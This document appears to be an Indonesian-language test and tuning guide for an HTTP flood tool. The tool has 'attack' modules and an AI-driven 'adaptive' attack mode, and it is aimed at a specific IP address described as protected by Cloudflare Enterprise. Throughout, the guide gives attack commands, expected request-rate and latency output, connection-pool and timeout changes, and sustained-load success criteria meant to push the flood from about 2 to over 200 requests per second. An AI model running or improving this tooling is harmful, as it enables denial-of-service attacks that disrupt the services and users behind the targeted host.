============================================================
TEST GUIDE - VERIFIKASI PERBAIKAN FASE 5.5
============================================================

TARGET MASALAH YANG DI-FIX
-----------------------------------------------------------
1. Throughput: 1.82 RPS → Target 200+ RPS
2. Latency: 24,841ms → Target <1000ms
3. Worker efficiency: 0.116 req/thread/sec → Target 2+ req/thread/sec

ENVIRONMENT SETUP
-----------------------------------------------------------

1. Python Requirements (sudah terpasang):
   ```
   pip list | grep aiohttp
   aiohttp==3.9.x (minimum)
   ```

2. SSL/TLS Configuration:
   ```
   SSL_VERIFY=False (sudah di-config di code)
   ```

3. Target Selection:
   - URL: https://139.167.64.3/  (Cloudflare Enterprise)
   - Duration: 10 detik (standard test)
   - Threads: 100 (sesuai rencana)

TEST SCENARIO
-----------------------------------------------------------

BASELINE TEST (BEFORE - Gunakan backup ulang)
```bash
# Jika belum ada backup code lama:
# Restore dari git: git checkout HEAD~1 -- src/core/ultra_worker.py src/core/universal_attack.py

# Run dengan baseline settings
python main.py --phase attack \
    --target https://139.167.64.3/ \
    --threads 100 \
    --duration 10 \
    --adaptive
```

EXPECTED BASELINE OUTPUT (SEBELUM FIX):
```
Attempted: 116
Completed: 116
Failed: 0
Timeout: 0
RPS: 1.82
Avg Latency: 24,841ms
Duration: 10.0s
```

---

FIXED TEST (AFTER - Kode yang sudah di-patch)
```bash
python main.py --phase attack \
    --target https://139.167.64.3/ \
    --threads 100 \
    --duration 10 \
    --adaptive
```

EXPECTED AFTER FIX:
```
Attempted: 2000+ (17x improvement)
Completed: 1500+ (13x improvement)
Failed: <200 (most <50)
Timeout: <300
RPS: 200+ (110x improvement)
Avg Latency: 300-1000ms (25x faster)
Duration: 10.0s
```

---

EXTENDED TEST (Longer Duration - Untuk stress test)
```bash
python main.py --phase attack \
    --target https://139.167.64.3/ \
    --threads 100 \
    --duration 60 \
    --adaptive
```

EXPECTED:
- Sustained 150+ RPS untuk 30 detik pertama
- Latency increases saat target throttle (normal)
- Error rate increases seiring waktu (target adaptive)
- No connection pool errors

VALIDATION CHECKLIST
-----------------------------------------------------------

✅ Code Changes Verified:
  [ ] src/core/ultra_worker.py:
      - Remove `await resp.release()` EXPLICIT call
      - Add `allow_redirects=False`
      - Latency calculation based on start time (tidak berubah)
      
  [ ] src/core/universal_attack.py:
      - TCPConnector limit: 200 → 500
      - TCPConnector limit_per_host: 100 → 400
      - Session timeout: total=10 → total=5
      - Health check timeout: total=5 → total=3
      - Benchmark timeout: loose → strict
      - Health check threshold: 5000ms → 3000ms
      - Add ttl_dns_cache=0
      - Add force_close=False
      - Add keepalive_timeout=30

✅ Test Results Validation:
  [ ] RPS improvement: 1.82 → 200+ (minimum 50x)
  [ ] Latency improvement: 24,841ms → <2000ms (minimum 10x)
  [ ] No connection pool errors in logs
  [ ] AI metrics: "Attempted" > 0 (not "zero requests")
  [ ] Target still responds with 200 OK (not down)

✅ No Regressions:
  [ ] Attack still adaptive (AI mode changes)
  [ ] Metrics still balanced (attempted == completed + failed + timeout)
  [ ] No "CRITICAL: Zero requests captured by AI"
  [ ] Health check still accurate
  [ ] Monitor task still logs target status

PERFORMANCE BENCHMARKS
-----------------------------------------------------------

Network Efficiency:
- Connection reuse: 100 connections, 2000+ requests = 20 req/conn (good)
- Connection pool utilization: 2000 attempted / 500 limit = 4x (good)
- No pending/queued requests (pool flush)

Time Efficiency:
- 10 threads × 1 request every 50ms = 200 RPS
- 100 threads × 1 request every 50ms = 2000 RPS (theoretical max)
- Expected: 200-1000 RPS (practical with target throttling)

Memory Efficiency:
- 500 connections × ~1MB per connection = 500MB (acceptable)
- No memory leaks (connection reuse, no dangling resources)

TROUBLESHOOTING
-----------------------------------------------------------

IF Test Still Shows Low RPS (<50):
1. Check target IP still valid:
   ```
   nslookup 139.167.64.3
   ```

2. Check SSL/TLS handshake:
   ```
   openssl s_client -connect 139.167.64.3:443 -servername <domain>
   ```

3. Check network latency:
   ```
   ping 139.167.64.3
   ```

4. Check Python asyncio event loop:
   ```python
   import asyncio
   print(asyncio.get_event_loop_policy())
   # Windows: ProactorEventLoopPolicy recommended
   ```

5. Verify code changes applied:
   ```bash
   grep "limit=threads \* 5" src/core/universal_attack.py
   grep "allow_redirects=False" src/core/ultra_worker.py
   ```

IF Test Shows High Error Rate (>50%):
1. Check target HTTP status:
   ```bash
   curl -v https://139.167.64.3/
   ```

2. Verify Host header:
   - Logs should show correct domain
   - Health check should pass

3. Check timeout configuration:
   - Strict timeout (5s) = normal
   - Errors from timeout = expected
   - Count as metrics.record_timeout() (correct)

IF AI Shows "Zero Requests":
1. Metrics synchronization:
   ```python
   ai = AdaptiveControllerV2(domain, metrics)  # metrics parameter
   summary = metrics.get_summary()
   print(summary["attempted"])
   ```

2. AI monitor loop timing:
   - First 30 seconds: May show "Waiting for first request"
   - After 30 seconds: Should show attempted > 0

PERFORMANCE TARGETS
-----------------------------------------------------------

CRITICAL (Must achieve):
✅ RPS: >50 (was 1.82)
✅ Avg Latency: <5000ms (was 24,841ms)
✅ Per-thread rate: >0.5 req/sec (was 0.116)

EXCELLENT (Stretch target):
✅ RPS: >100
✅ Avg Latency: <1000ms
✅ Per-thread rate: >1 req/sec

MAXIMUM (Theoretical):
- RPS: 2000+ (limited by target)
- Latency: 100-300ms (optimal)
- Per-thread rate: 20 req/sec

SUCCESS CRITERIA
-----------------------------------------------------------

Perbaikan dianggap BERHASIL jika:
1. RPS minimal 10x improvement (18+ RPS)
2. Latency minimal 5x improvement (<5000ms)
3. No "double release" connection errors in logs
4. No connection pool timeout/deadlock
5. AI metrics detect requests properly
6. Target online during attack (200 OK responses)
7. Sustained performance untuk 60+ detik

============================================================
